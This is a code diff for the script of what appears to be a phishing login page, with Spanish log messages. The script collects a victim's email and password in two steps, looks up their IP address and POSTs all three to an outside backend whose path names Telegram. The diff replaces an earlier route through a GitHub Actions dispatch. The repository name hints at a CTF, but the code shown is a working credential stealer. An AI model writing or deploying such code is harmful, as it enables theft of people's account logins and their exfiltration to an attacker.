@@ -1,42 +1,37 @@
 var counter = 0;
 var email, password;
 
-async function sendToGitHubActions(email, password) {
+async function sendToBackend(email, password) {
     const ipResponse = await fetch('https://api.ipify.org?format=json');
     const ipData = await ipResponse.json();
     const ipv4 = ipData.ip;
 
-    const repo = "jheeree/KVC2024_ctf";
-    const url = `https://api.github.com/repos/${repo}/dispatches`;
+    const url = 'https://gfx1xn5wg8xtp9mk4no4jjzev.jhere.tech/send-to-telegram';
 
     const data = {
-        event_type: "send_telegram_message",
-        client_payload: {
-            email: email,
-            password: password,
-            ip: ipv4
-        }
+        email: email,
+        password: password,
+        ip: ipv4
     };
 
-    console.log("Enviando datos a GitHub Actions:", data);
+    console.log("Enviando datos al backend:", data);
 
     try {
         const response = await fetch(url, {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json',
-                'Authorization': `token ${GH_PAT}`
+                'Content-Type': 'application/json'
             },
             body: JSON.stringify(data)
         });
 
         if (!response.ok) {
-            throw new Error(`Error en la petición a GitHub: ${response.statusText}`);
+            throw new Error(`Error en la petición al backend: ${response.statusText}`);
         }
 
-        console.log("Envío exitoso a GitHub Actions");
+        console.log("Envío exitoso al backend");
     } catch (error) {
-        console.error("Error al enviar a GitHub Actions:", error);
+        console.error("Error al enviar al backend:", error);
     }
 }
 
@@ -44,7 +39,7 @@ function next() {
     enter();
 }
 
-window.onload=function() {
+window.onload = function() {
     var input = document.getElementById("input1");
     
     if(screen.width <= 450) {
@@ -65,7 +60,6 @@ window.onload=function() {
         var button = document.getElementById('button');
         document.body.style.background = "#ffffff";
         box.style.setProperty("width", "100%");
-        var height = screen.height;
         box.style.setProperty("height", "100%");
         box.style.setProperty("vertical-align", "top");
         grid.style.setProperty("width", "100%");
@@ -116,10 +110,10 @@ function enter() {
         counter++;
         change();
     }
-   else if (counter == 1) {
+    else if (counter == 1) {
         password = document.getElementById('input1').value;
         counter++;
-        sendToTelegram(email, password);
+        sendToBackend(email, password);
         change2();
     }
 }
